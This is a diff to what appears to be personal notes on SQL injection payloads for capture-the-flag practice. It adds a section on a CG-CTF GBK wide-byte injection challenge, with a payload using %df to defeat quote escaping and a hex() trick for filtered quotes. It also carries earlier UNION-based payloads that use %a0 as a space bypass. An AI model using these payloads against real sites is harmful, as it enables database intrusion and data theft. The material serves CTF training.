@@ -153,3 +153,17 @@ SELECT * FROM users WHERE id='1' union select database(),1,1,1 and '1'='1'
 ```
 id=1'%a0union%a0select%a0database(),1,1,1%a0and%a0'1'='1'
 ```
+
+
+## CG-CTF gbk-injection
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1
+
+```
+0%df' union select 1,2#
+```
+
+爆列名单引号被过滤，使用16进制
+```
+select hex('gbksqli');
+```
+
